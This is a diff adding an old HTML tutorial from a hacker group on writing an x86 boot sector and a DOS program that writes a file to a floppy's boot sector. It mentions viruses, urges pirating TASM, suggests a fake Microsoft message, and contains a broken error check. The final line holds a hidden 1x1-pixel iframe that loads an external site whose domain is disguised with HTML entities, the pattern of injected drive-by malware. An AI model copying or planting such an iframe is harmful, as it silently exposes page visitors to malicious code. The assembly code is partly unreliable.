@@ -1,0 +1,505 @@
+<html>
+<head>
+<title>The Boot Sector</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+<body bgcolor="#000000" text="#ffffff" link="#ffffff" vlink="#ffffff">
+<div align="center">
+<table width="680" border="0" cellspacing="2" cellpadding="2" align="center">
+  <tr>
+    <td width="693">
+      <pre>
+                        :::::::::   ::::::::  :::::::::  ::::::::::
+                        :+:    :+: :+:    :+: :+:    :+: :+:
+                        +:+    +:+ +:+        +:+    +:+ +:+
+                        +#++:++#+  +#++:++#++ +#++:++#:  :#::+::#
+                        +#+    +#+        +#+ +#+    +#+ +#+
+                        #+#    #+# #+#    #+# #+#    #+# #+#
+                        #########   ########  ###    ### ###
+
+              	             <a href="http://blacksun.box.sk" target="_blank">http://blacksun.box.sk</a>
+              	             <a href="http://awc.rejects.net" target="_blank">http://awc.rejects.net</a>
+                           _____________________________
+    ______________________I       <b>   Topic:</b>             I_____________________
+   \                      I                             I                    /
+    \     HTML by:        I      <b>The Boot Sector</b>        I   Written by:     /
+    >                     I                             I                  <
+   /      <a href="mailto:black_mesa@hacktik.org">Martin L.</a>       I_____________________________I   <a href="mailto:fu@ckz.org">Ralph</a>           \
+  /___________________________>                    <_________________________\</pre>
+    </td>
+  </tr>
+</table>
+</div>
+<p>Version: 1.0 Date: 7/31/00</p>
+<h3>TOC</h3>
+<ol>
+  <li><a href="#1">Introduction</a><ul>
+  <li><a href="#1a">What you need</a></li></ul></li>
+  <li><a href="2">Basic hard drive/BIOS shit</a></li>
+  <li><a href="3">Making a Boot Sector</a></li>
+  <li><a href="4">Making a program to write a boot sector</a></li>
+  <li><a href="5">Other</a></li>
+</ol>
+<a name="1"><h3><u>1. Introduction</u></h3>
+<blockquote>
+<p>Well usually I give you a specific purpose at this point, but in this case I can't.
+I was just in the mood to write something on boot sectors so I did it.  And maybe
+(hopefully) someone out there can make use of this info.  This thing will most likely
+became part of a larger tutorial, maybe something on assembly or on OS design.
+After having consumed this text file you should know enough to design and create your
+own boot sector, maybe for a virus, or an OS, or...?</a>
+</blockquote>
+<a name="1a"><h3><u>What you need</u></h3>
+<blockquote>
+<p>Before reading this you should have a basic knowledge of assembly.  If you don't, read
+my other tutorial, it's called Sk00l m3 ASM!!#@$!@# and is available from awc.rejects.net
+We will be using 2 different programs to code this shit: NASM and TASM.  NASM is freely
+available from <a href="http://www.web-sites.co.uk/nasm/" target="_blank">http://www.web-sites.co.uk/nasm/</a>, but TASM you have to buy.  I don't like
+piracy, but if you're just gonna use TASM this once, don't bother spending $150 on it.
+There are plenty of sites that have a copy.</p>
+<p>Why am I using 2 different programs?  Well I have always used NASM to make simple
+programs as it's good at creating efficient memory copies.  I always use TASM to make
+programs a bit more complex.  In the end however it comes down to the answer "why not??".
+However, it shouldn't be hard at all to make the TASM program in NASM (or the other way
+around), just change a few things here and there.  If enough people come bitch to me, I'll
+rewrite all the code for NASM/TASM.</p></blockquote>
+<a name="2"><h3><u>2. Basic hard drive/BIOS shit</u></h3>
+<blockquote>
+<p>As soon as you flip that switch, your CPU starts executing shit located at F000:FFF0.
+This area contains the BIOS, Basic Input/Output System.  This code is written in assembly
+and is stored in chips called EPROMs in your computer.  This code will perform something
+known as POST, Power On Self Test.  This checks for installed devices and checks if they
+all work.  In particular it checks for the video card and runs the video BIOS usually
+located at C000h.  Next it checks for other ROMs to see if they have installed BIOSes.
+Usually it then finds and executes the hard drive BIOS located at C8000h.  Then it starts
+something like a "system inventory" where it checks for other installed devices and
+tests them.  It does some more stuff that's all basicly useless for us right now,
+until it finally transfers control over to the operating system.  That's the part that
+we're interested in.  Back in the old days, only one OS was installed on a computer.
+If you bought a certain computer, you could only run the OS that was made for it.
+Nothing else.  Obviosly that wasn't such a good thing as you would have to buy a new
+computer if you wanted a different OS, so BIOS makers came up with the Boot Sector.
+In case you didn't know yet, a Sector is the smallest area your hard drive can access.
+According to the ATA standards each sector is exactly 512 bytes.  However ATA standards
+only apply to hard drives, things like floopies can use whatever they want.
+Knowing this we can move on to the boot sector.</p>
+</blockquote>
+<h3><u>3. Making a Boot Sector</u></h3>
+<blockquote>
+<p>After the BIOS has successfully completed the POST it calls interrupt 19h.  You can
+actually see this by dumping the memory located at F000:FFF0.  For example, on my box
+I used debug with the following result:<br>
+<i>-d f000:fff0</i><br>
+F000:FFF0  CD 19 E0 00 F0 31 31 2F-32 36 2F 39 39 00 FC 81   .....11/26/99...</p>
+<p>As you should know, CD = INT.  INT 19h attempts to read in the Boot Sector of the 1st
+floppy disk.  If it fails it does the same thing on the 1st hard drive.  If that fails
+it returns an error message.  A valid boot sector must have its last two bytes set to
+AA55h.  Assuming a valid boot sector is found, the code is loaded into memory at location
+0000:7C00 and interrupt 19h jumps there to start executing the code.  Since a boot sector
+has to fit into one sector (512 bytes) it can't really do much, usually it does a search
+for another file on another sector, then executes it.  Our boot sector won't do that.
+For now it is enough that it displays a message and reboots when you press a key.  Since
+DOS is not loaded yet, we have to use BIOS interupts to do all this.  First we display a
+messages using interupt 10h.  Next we wait for the user to press a key using interrupt
+16h, and finally we make a FAR jump to FFFF:0000 which we restart the computer.  So lets
+code this bitch:</p>
+<p>First we use the code</p>
+<table>
+<tr>
+  <td>&nbsp;</td>
+  <td>MOV AX,0x0003</td>
+</tr>
+<tr>
+  <td>&nbsp;</td>
+  <td>INT 0x10</td>
+</tr>
+<tr>
+  <td colspan="2">to get into video mode.  The registers have to be set up like this:</td>
+</tr>
+<tr>
+  <td>AH</td><td>Function number (00h, video)</td>
+</tr>
+<tr>
+  <td>AL</td><td>Video Mode (03, 80x25x16)</td>
+</tr>
+<tr>
+  <td colspan="2">Next we print the message using:</td>
+</tr>
+<tr>
+  <td>&nbsp;</td><td>MOV AX,0x1301</td>
+</tr>
+<tr>
+  <td>&nbsp;</td><td>MOV BX,0x0007</td>
+</tr>
+<tr>
+  <td>&nbsp;</td><td>MOV CX,0x23</td>
+</tr>
+<tr>
+  <td>&nbsp;</td><td>MOV BP,MSG</td>
+</tr>
+<tr>
+  <td>&nbsp;</td><td>ADD BP,0x7C00</td>
+</tr>
+<tr>
+  <td>&nbsp;</td><td>INT 0x10</td>
+</tr>
+<tr>
+  <td>AH</td><td>Function number (13h: print string)</td>
+</tr>
+<tr>
+  <td>AL</td><td>Write Mode (01h: string is characters only, attribute in BL, cursor moved)</td>
+</tr>
+<tr>
+  <td>BH</td><td>Video Page number (00h)</td>
+</tr>
+<tr>
+  <td>BL</td><td>Attributes of characters (07h)</td>
+</tr>
+<tr>
+  <td>CX</td><td>Length of string, excluding any attributes (23h = 35 characters)</td>
+</tr>
+<tr>
+  <td>BP</td>
+  <td>ES:BP must point to the string, since a boot sector starts at 07C00, we add that
+     to BP after we loaded it.  You could also set the entry point of the program to
+     07C00, or change the data segment register to point to 07C00, but since it's just
+     one instruction, this is fine for now.</td>
+</tr>
+<tr>
+  <td colspan="2">Now we wait for the key to be pressed:</td>
+</tr>
+<tr>
+  <td>&nbsp;</td><td>MOV AH,0x00</td>
+</tr>
+<tr>
+  <td>&nbsp;</td><td>INT 0x16</td>
+</tr>
+</table>
+<p><b>Registers:</b><br>
+AH - 00, Read keyboard buffer, wait till full if not already.<br>
+The buffer will be empty since the computer didn't get time to put anything into it yet.
+Finally we reboot the computer by simply jumping to 0000:FFFF:</p>
+<blockquote>
+<p>DB 0xEA<br>
+     DW 0x0000<br>
+     DW 0xFFFF</p>
+</blockquote>
+<p>This looks a bit wierd but it's actualy quite simple.  When declaring "variables" in
+assembly, the assembler simply puts the value into a memory location.  Usually you
+use interrupts or something to point to them in order to use and manipulate them, but we
+could also put code there.  This is what we're doing here.  If you get a Hex to Mnemonix
+chart you will notice that EA is a Far Jump.  So we put that into memory, followed by
+the location to jump to.</p>
+<p>Next we fill the the remaining memory with NULL:<br>
+<blockquote>
+     TIMES 510-($-$$) DB 0</p>
+</blockquote>
+<p>This could also be done in TASM with something like TIMES 510 DUP (0).
+Finally we have to add those two bytes to the end so that the BIOS will know that this is
+a valid boot sector. This is done with the simple statement:<br>
+<blockquote>
+SIGNATURE DW 0xAA55</p>
+</blockquote>
+<p>Here is the full code to everything we just discussed:</p>
+<table>
+<tr>
+  <td colspan="2"><b>START:</b></td>
+</tr>
+<tr>
+  <td width="25">&nbsp;</td>
+  <td>MOV AX,0x0003</td>
+</tr>
+<tr>
+  <td>&nbsp;</td><td>INT 0x10</td>
+</tr>
+<tr>
+  <td colspan="2"><b>PRINT_STRING:</b></td>
+</tr>
+<tr>
+  <td>&nbsp;</td><td>MOV AX,0x1301</td>
+</tr>
+<tr>
+  <td>&nbsp;</td><td>MOV BX,0x0007</td>
+</tr>
+<tr>
+  <td>&nbsp;</td><td>MOV CX,0x23</td>
+</tr>
+<tr>
+  <td>&nbsp;</td><td>MOV BP,MSG</td>
+</tr>
+<tr>
+  <td>&nbsp;</td><td>ADD BP,0x7C00</td>
+</tr>
+<tr>
+  <td>&nbsp;</td><td>INT 0x10</td>
+</tr>
+<tr>
+  <td colspan="2"><b>WAIT_FOR_KEY_PRESS:</b></td>
+</tr>
+<tr>
+  <td>&nbsp;</td><td>MOV AH,0x00</td>
+</tr>
+<tr>
+  <td>&nbsp;</td><td>INT 0x16</td>
+</tr>
+<tr>
+  <td colspan="2"><b>REBOOT:</b></td>
+</tr>
+<tr>
+  <td>&nbsp;</td><td>DB 0xEA</td>
+</tr>
+<tr>
+  <td>&nbsp;</td><td>DW 0x0000</td>
+</tr>
+<tr>
+  <td>&nbsp;</td><td>DW 0xFFFF</td>
+</tr>
+<tr>
+  <td colspan="2"><b>MSG  DB 'pR3sS 4nY k3y 2 k0n71nu3',13,10,'btw, ph33r',0</b></td>
+</tr>
+<tr>
+  <td>&nbsp;</td><td>TIMES 510-($-$$) DB 0</td>
+</tr>
+<tr>
+  <td colspan="2"><b>SIGNATURE DW 0xAA55</b></td>
+</tr>
+</table>
+<p>Assemble with "nasm filename.asm".  This will get you a file called "filename", no
+extension.  It is a raw binary image of the code.  Get out a floppy and type
+"debug filename".  Enter this at the prompt: w 100 0 0 1.   You should know what this
+does from my assembly tutorial, if not it simply means write whatever is in memory to
+location 100 on disk 0 (A:), starting from sector 0 to sector 1.  Now try booting from
+this disk.  You should get the message:</p>
+<blockquote>
+<p>pR3sS 4nY k3y 2 k0n71nu3<br>
+btw, ph33r</p>
+</blockquote>
+<p>And when you press a key, the keyboard buffer gets filled so interupt 16h is finished and
+we move on to the restart procedure.  Obviously this was just a simply example, instead
+of printing a string, waiting for a key press and restarting, you could've put anything
+in there, just as long as you don't use DOS interupts.  One nice thing might be to get
+into Protected Mode, or you could even do some graphics shit which might run faster than
+in DOS or Windows since nothing is in memory except what you want to be there.</p>
+</blockquote>
+<h3><u>4. Making a program to write a boot sector</u></h3>
+<blockquote>
+<p>If you tryed to access the disk with your boot sector on it, you'll notice that you
+can't.  At least not using DOS.  That's because DOS uses a few bytes of memory for data
+that it needs to know in order to determine what kind of disk it is, our program however
+uses those bytes for the code.  Now, you could look up those memory areas and declare
+them at the start of your program, but instead we will just create a program that will
+write any kind of file directly to the boot sector of a disk, regardless of what's on
+that disk.  This sounds harder than it really is.  In fact, the resulting program is
+a mere 73 bytes.  First of all we have to open the file we want to write to the boot
+sector using the code:</p>
+<p>READFILE:<br>
+<blockquote>
+    MOV AX,3D00h<br>
+    MOV DX,OFFSET FILENAME<br>
+    INT 21h</p>
+</blockquote>
+<p>AH = 3Dh, Open file<br>
+AL = 00, open file as read only<br>
+DX = Points to file name.  This has to be a ASCIIZ string, meaning it's terminated with
+     a NULL character (0).</p>
+<p>This will return the file handle in AX.  If an error has occured, the carry flag will be
+set and the error code stored in AH.  In that case, branch:<br>
+<blockquote>
+    JC ERROR<br>
+</blockquote>
+Otherwise proceed to reading in the file:<br>
+<blockquote>
+    MOV BX,AX<br>
+    MOV AH,3Fh<br>
+    MOV CX,0200h<br>
+    MOV DX,OFFSET SHIT<br>
+    INT 21h</p>
+</blockquote>
+<p>First we move the file handle from AX into BX, then set up the other registers as
+follows:<br>
+AH = 3Fh, Read file<br>
+CX = 200h, Amount of data to read.  Since a boot sector will always be 512 bytes long
+     we read in 200h bytes (512d).<br>
+DX = Points to memory area to hold contents of file<br>
+Again, the carry flag will be set if an error occured, so branch:<br>
+<blockquote>
+    JC ERROR</p>
+</blockquote>
+<p>Now we're getting to the actual writing part.  First we reset the floppy disk controller
+with the code:<br>
+WRITE_SECTOR:<br>
+<blockquote>
+    MOV AH,0h<br>
+    MOV DL,0<br>
+    INT 13h<br>
+</blockquote>
+Next we write the data:<br>
+<blockquote>
+    MOV AX,0301h<br>
+    MOV CX,1<br>
+    MOV DX,0<br>
+    MOV BX,OFFSET SHIT<br>
+    INT 13h</p>
+</blockquote>
+<p>This is one of the more complicated interupts, and you have to know some shit about how
+hard drives are made up.<br>
+AH = 03h, Write Sector<br>
+AL = 1, Number of sectors to write on same track and head<br>
+CH = 0, Track number to write<br>
+CL = 1, Sector number to start writing from<br>
+DH = 0, Head number to write<br>
+DL = 0, Drive number to write (0 = A, 1 = B, etc)<br>
+BX = Buffer to write sector(s) from</p>
+<p>Again the carry flag is set if an error occurs, but I like to keep things interesting and
+used a different method to check for an error.  The error code is stored in AH, if AH
+is 0 there was no error.  So to check for an error I can simply XOR AH, AH and Jump if
+Not Zero.<br>
+<blockquote>
+    XOR AH,AH<br>
+    JNZ ERROR<br>
+</blockquote>
+Otherwise, we're done and can terminate the program:<br>
+<blockquote>
+    INT 20h</p>
+</blockquote>
+<p>So the finished program looks like this:<br>
+<table>
+<tr>
+  <td width="250">MAIN SEGMENT</td>
+  <td width="300">;the usual setup I use for .com files</td>
+</tr>
+</table>
+<blockquote>
+     ASSUME CS:MAIN,DS:MAIN,ES:MAIN,SS:MAIN<br>
+     ORG 100h</p>
+</blockquote>
+<p>START:<br>
+<table>
+<tr>
+  <td width="250">READFILE:</td>
+  <td width="300">;reads file as explained above</td>
+</tr>
+</table>
+<blockquote>
+    MOV AX,3D00h<br>
+    MOV DX,OFFSET FILENAME<br>
+    INT 21h<br><br>
+
+    JC ERROR<br><br>
+
+    MOV BX,AX<br>
+    MOV AH,3Fh<br>
+    MOV CX,0200h<br>
+    MOV DX,OFFSET SHIT<br>
+    INT 21h<br><br>
+
+    JC ERROR</p>
+</blockquote>
+<p>
+<table>
+<tr>
+  <td width="250">WRITE_SECTOR:</td>
+  <td width="300">;writes sectors as explained above</td>
+</tr>
+</table>
+<blockquote>
+    MOV AH,0h<br>
+    MOV DL,0<br>
+    INT 13h<br><br>
+
+    MOV AH,03h<br>
+    MOV AL,1<br>
+    MOV CX,1<br>
+    MOV DX,0<br>
+    MOV BX,OFFSET SHIT<br>
+    INT 13h<br><br>
+
+    XOR AH,AH<br>
+    JNZ ERROR<br><br>
+
+    INT 20h</p>
+</blockquote>
+<p>ERROR:<br>
+<table>
+<tr>
+  <td width="250">MOV AH,09h</td>
+  <td width="300">;displays error message</td>
+</tr>
+</table>
+<blockquote>
+    MOV DX, OFFSET SHIT1<br>
+    INT 21h<br>
+    INT 20h</p>
+</blockquote>
+<table>
+<tr>
+  <td>SHIT</td>
+  <td>DB ?</td>
+  <td>;uninitialized array to hold contents of file</td>
+</tr>
+<tr>
+  <td>SHIT1</td>
+  <td>DB 'Error$'</td>
+  <td>;Bad ass error message</td>
+</tr>
+<tr>
+  <td>FILENAME</td>
+  <td>DB 'ph33r',0</td>
+  <td>;filename to write</td>
+</tr>
+<tr>
+  <td colspan="2">MAIN ENDS</td>
+</tr>
+<tr>
+  <td colspan="2">END START</td>
+</tr>
+</table>
+
+<p>Now this thing is very very basic.  There are many areas you could improve on.  For
+example:</p>
+<ol>
+<li>Make the filename a user inputed value.  To do so, make FILENAME an array of 12
+    unitialized bytes (DOS filenames can't be longer than that).  Than load that array
+    into SI and call interupt 16h, function 0h.  Loop it until enter is pressed, store
+    the value in SI, incrementing SI each time.</li>
+    <li>Add more error messages, maybe even something that checks the error code and response
+    with an appropriate message</li>
+    <li>This program wont wait for the motor to start up, so make a loop that loops about 3
+    times, checking if the disk drive is ready.  If all tries fail, return an error
+    saying that the disk is not in the drive or something.  The error code is returned in
+    AH, so you can make a simple check and respond with the corrosponding error message.</li>
+    <li>Display a (C) Microsoft message</li>
+</ol>
+
+
+</blockquote>
+<h3><u>5. Other</u></h3>
+<blockquote>
+<p>If you fuck up your computer as a result of this tutorial, don't blame me.  All code
+has been tested and works great, but I cannot be held responsible for anything that
+happens to you as a result of using this information.</p>
+<p>You may freely distribute this text as long as you don't change anything.  If there's
+something you think should be changed, contact me first.</p>
+<p>Please always get the newest version of this an other tutorials at <a href="http://awc.rejects.net" target="_blank">http://awc.rejects.net</a>
+as they usually contained updated information, and addons.</p>
+<p>Send feedback to <a href="mailto:fu@ckz.org">fu@ckz.org</a></p>
+<p>Greetings to:<br>
+cozgedal, skin_dot, Linxor, jyc, rpc, moJoe, Lindex, aphex twin</p>
+<pre>
+
+
+                       ____w4r3z w4g0n with fr3sh 0-day k0d3z
+                      /
+   /-------------------\
+   |     w4r3z w4g0n    |----\ &lt;----driver of w4r3z w4g0n wearing special AWC k4m0phl4g3
+   |     fr3sh 0-day    | [ ] |     kl04k1ng d3v1c3
+   \____________________|_____|
+     \__/     /|\         \__/ &lt;---- tires of w4r3z w4g0n in special 0kt4g0n format
+             ^ O ^
+                  \_____Bill Gates being dragged on the street by w4r3z w4g0n because he
+                        tryed to steal 0-day k0d3z and must be punished</pre>
+<p>EOF</p>
+</blockquote>
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
